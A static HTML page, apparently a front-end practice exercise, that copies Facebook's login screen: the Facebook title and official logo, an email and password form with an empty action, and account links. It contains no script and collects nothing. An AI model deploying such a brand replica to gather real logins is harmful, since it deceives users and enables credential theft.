<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <link rel="stylesheet" href="style.css" />
  <title>Facebook</title>
</head>

<body>
  <div id="container">
    <div id="content-box">
      <div id="logo">
        <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Facebook" />
      </div>
      <div id="content">
        <h2>Connect with friends and the world around you on Facebook.</h2>
      </div>
    </div>
    <div id="section">
      <div id="login-form">
        <form action="" id="form">
          <label for="email"></label>
          <input type="email" name="email" id="email" class="input-field" placeholder="Email or phone number"
            required />
          <br />
          <input type="password" name="password" id="password" class="input-field" placeholder="Password" required />
          <br />
          <input type="submit" value="Log In" id="login-btn" /> <br />
          <a href="" id="link">Forgot password?</a>
          <hr />
        </form>
        <div id="new-btn">
          <button id="btn">Create new account</button>
        </div>
      </div>
      <p> <a href="#" id="create-page">Create a Page </a> for a celebrity, brand or business</p>
    </div>
  </div>
</body>

</html>
